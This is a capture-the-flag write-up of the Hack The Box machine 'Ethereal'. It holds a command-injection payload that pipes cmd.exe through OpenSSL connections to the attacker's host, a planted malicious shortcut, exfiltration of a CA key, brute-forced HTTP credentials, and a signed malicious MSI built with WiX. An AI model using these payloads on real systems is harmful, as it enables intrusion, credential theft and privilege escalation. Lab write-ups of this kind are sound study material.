&lt;h4 id=&quot;we-see-a-directory-called-bin-thats-where-opensslexe-is-located-so-the-path-is-cprogra2openssl-v110binopensslexe&quot;&gt;We see a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;bin&lt;/code&gt; that’s where &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt; is located so the path is &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-everything-is-ready--in-the-ping-page-we-will-write-this-&quot;&gt;Now everything is ready , in the ping page we will write this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-check-our-server-&quot;&gt;Then we will check our server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-will-write-the-commands-on-the-first-server-port-73--then-we-will-refresh-the-ping-page--to-send-the-post-request-again-this-will-pipe-our-input-from-port-73-to-cmdexe-then-to-the-server-on-port-136-then-we-will-get-our-output-on-the-second-server&quot;&gt;Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/47.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/48.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;alans-desktop-doesnt-have-the-flag-so-we-need-to-escalate-to-another-user--theres-a-note-on-alans-desktop-in-a-file-called-note-drafttxt&quot;&gt;alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;note-draft.txt&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;creating-a-malicious-lnk-and-getting-user&quot;&gt;Creating a malicious lnk and getting User&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-note-we-knew-that-theres-a-lnk-on-publics-desktop-and-other-users-on-the-box-are-using-it&quot;&gt;From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-if-we-replaced-it-with-a-payload-we-can-get-a-shell-as-another-user-theres-a-tool-on-github-called-lnkup-i-used-it-to-create-the-payload-&quot;&gt;So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called &lt;a href=&quot;https://github.com/Plazmaz/LNKUp&quot;&gt;LNKup&lt;/a&gt; I used it to create the payload :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-uplaod-it-we-will-close-any-one-of-the-servers-and-run-it-again-but-this-time-we-will-redirect-the-lnk-file-to-it-&quot;&gt;To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-on-the-ping-page-we-will-type-this-&quot;&gt;Then on the ping page we will type this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &amp;gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-close-the-server--run-the-2-servers-and-get-our-shell-as-alan-like-we-did-before--then-we-will-delete-the-original-lnk-and-copy-ours-with-the-name-of-the-old-lnk-&quot;&gt;We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/55.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp;amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp;amp; dir c:\users\public\desktop\shortcuts&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-close-the-2-servers--run-them-again-and-wait-for-someone-to-execute-the-lnk-file--after-a-minute-we-will-get-a-shell-as-jorge-&quot;&gt;Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;with-this-we-dont-need-to-refresh-any-pages-because-the-connection-is-not-handled-by-the-ping-page-anymore-so-the-command-will-be-piped-immediately-from-the-first-server-to-the-second-server&quot;&gt;With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally-we-owned-user-&quot;&gt;Finally we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;more-filesystem-enumeration&quot;&gt;More Filesystem Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;if-we-checked-the-other-drives-&quot;&gt;If we checked the other drives :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fsutil fsinfo drives&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-find-that-c-is-not-the-only-drive-and-theres-also-d&quot;&gt;We will find that &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; is not the only drive and there’s also &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;unfortunately-if-someone-started-to-enumerate-without-doing-this-important-step-in-windows-enumeration--they-wont-get-anything&quot;&gt;Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.&lt;/h4&gt;
&lt;h4 id=&quot;contents-of-d&quot;&gt;Contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-dev-theres-a-directory-called-msis-and-it-has-a-note-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;DEV&lt;/code&gt; there’s a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;MSIs&lt;/code&gt; and it has a note :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-have-to-create-a-malicious-msi-and-place-it-there-to-get-a-shell-as-rupal-we-also-need-to-get-the-certs-to-sign-the-msi--the-certs-are-found-in-dcerts--mycacer-and-mycapvk--to-transfer-them-to-our-box-we-will-use-openssl-to-base64-encode-the-certs-then-we-can-copy-and-decode-on-our-box&quot;&gt;So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in &lt;code class=&quot;highlighter-rouge&quot;&gt;D:\Certs&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;MyCA.cer&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;MyCA.pvk&lt;/code&gt; , to transfer them to our box we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to base64 encode the certs then we can copy and decode on our box.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/62.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-will-go-to-a-windows-box-again-to-create-the-msi&quot;&gt;Now we will go to a windows box again to create the msi&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;creating-malicious-msi-and-getting-root&quot;&gt;Creating Malicious msi and getting root&lt;/h3&gt;
&lt;h4 id=&quot;in-order-to-create-the-msi-we-will-use-wixtools--you-can-use-other-msi-builders-but-they-didnt-work-for-me&quot;&gt;In order to create the msi we will use &lt;a href=&quot;http://wixtoolset.org/&quot;&gt;wixtools&lt;/a&gt; , you can use other msi builders but they didn’t work for me.&lt;/h4&gt;
&lt;h4 id=&quot;check-this-page-for-some-wix-msi-usage-examples&quot;&gt;Check &lt;a href=&quot;https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with&quot;&gt;this page&lt;/a&gt; for some wix msi usage examples.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-create-an-msi-that-executes-our-lnk-file-&quot;&gt;We will create an msi that executes our lnk file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Wix&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Product&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UpgradeCode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;12345678-1234-1234-1234-111111111111&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Example Product Name&quot;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Manufacturer=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@_xpn_&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1033&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Package&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InstallerVersion=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Compressed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Comments=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Windows Installer Package&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Media&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Cabinet=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;product.cab&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EmbedCab=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TARGETDIR&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SourceDir&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ProgramFilesFolder&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;INSTALLLOCATION&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Example&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Component&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ApplicationFiles&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Guid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;12345678-1234-1234-1234-222222222222&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Component&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Feature&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DefaultFeature&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Level=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;ComponentRef&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ApplicationFiles&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Feature&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmdline&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;cmd.exe /C &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Property&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;CustomAction&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Stage1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Execute=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deferred&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Directory=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TARGETDIR&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ExeCommand=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[cmdline]'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Return=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ignore&quot;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Impersonate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;CustomAction&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Stage2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Execute=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deferred&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Script=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vbscript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Return=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;check&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
fail_here
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CustomAction&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;InstallExecuteSequence&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Custom&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Stage1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;After=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InstallInitialize&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Custom&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Custom&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Stage2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Before=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InstallFiles&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Custom&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/InstallExecuteSequence&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Product&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Wix&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-will-use-candleexe-from-wixtools-to-create-a-wixobject-from-msixml&quot;&gt;We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;candle.exe&lt;/code&gt; from wixtools to create a wixobject from &lt;code class=&quot;highlighter-rouge&quot;&gt;msi.xml&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-lightexe-to-create-the-msi-file-from-the-wixobject&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;light.exe&lt;/code&gt; to create the msi file from the wixobject&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-need-tools-from-microsoft-sdk-to-sign-our-msi--first-we-will-use-makecertexe-to-create-new-certs-from-the-original-certs-we-got-from-the-box&quot;&gt;After that we need tools from microsoft sdk to sign our msi , first we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;makecert.exe&lt;/code&gt; to create new certs from the original certs we got from the box&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;makecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-ask-for-a-password-we-will-leave-it-blank-for-no-password-protection-&quot;&gt;It will ask for a password we will leave it blank for no password protection :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/67.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/68.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-pvk2pfxexe-to-create-a-pfx-for-both-the-cer-and-the-pvk-files&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;pvk2pfx.exe&lt;/code&gt; to create a pfx for both the cer and the pvk files.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-will-use-signtoolexe-to-sign-the-msi-with-the-pfx&quot;&gt;And finally we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;signtool.exe&lt;/code&gt; to sign the msi with the pfx&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ethereal/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-back-to-our-kali-we-will-upload-the-msi-the-same-way-we-uploaded-the-lnk-file-before--and-we-also-need-to-make-sure-that-the-lnk-file-is-in-cuserspublicdesktopshortcuts-because-the-msi-is-just-executing-that-lnk-we-will-put-the-msi-into-ddevmsis&quot;&gt;Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\users\public\desktop\shortcuts\&lt;/code&gt; because the msi is just executing that lnk. We will put the msi into &lt;code class=&quot;highlighter-rouge&quot;&gt;D:\DEV\MSIs&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-close-the-servers--run-them-again-and-wait-for-around-3-5-minutes-until-rupal-opens-the-msi&quot;&gt;Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ethereal/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-root-&quot;&gt;And we got root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---access&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/access/&quot;&gt;Hack The Box - Access&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---carrier&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/carrier/&quot;&gt;Hack The Box - Carrier&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to /etc/hosts as ethereal.htb , Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ethereal.htb And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first. HTTP Initial Enumeration On port 80 we see this website : The only interseting thing is in the menu we see an Admin-area : Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping : By going to notes we only get this : So now we know that there’s a “test connection” page somewhere , we also get a potential username alan. By clicking on messages we get nothing , but desktop : And it’s very clear that this is fake , also the user.txt is a troll : By clicking on ping we get redirected to port 8080 which asks us for authentication and it uses http basic auth : So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it. One more thing to check is sub directory enumeration with gobsuter or any alternative : gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://ethereal.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/03/06 21:51:24 Starting gobuster ===================================================== /corp (Status: 301) gobuster only found /corp with the wordlist /usr/share/wordlists/dirb/common.txt and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP FTP Enumeration On FTP there are some files but the most interesting ones are FDISK.zip and DISK.zip so we will check them first : We will unzip them : Then we will check what kind of files do we have with file : Most likely they are mountable disks so we will create a directory to mount them and call it mnt then we will make a directory for disk1 , disk2 and fdisk and finally we will mount them mount -o loop [Disk] [Directory] : In disk1 and disk2 there are some files that are not very interesting : But on fdisk there’s a directory called pbox : It contains an executable called pbox.exe and a dat file called pbox.dat : Getting Credentials We will switch to a windows box to run that executable , you can alternatively use wine or a program called dosbox. wine didn’t work for me and dosbox kept crashing every 15 seconds. When we try to open it it asks for a password : At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database : databases : msdn : learning : ftp drop : backup : website uploads : truecrypt : management server : svn : Back to our kali , now we can create a list with all the information we got : I put the passwords in a separate list to bruteforce the http auth with it : We will use wfuzz and we will try the username alan first : wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt Password : !C414m17y57r1k3s4g41n! Blind RCE Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. Now we can try to bypass that and inject system commands using &amp;amp; or | , but we don’t get any output. I also tried to host nc.exe on a python http server and used certutil to download it but the python server didn’t get any requests. Finally when I ran 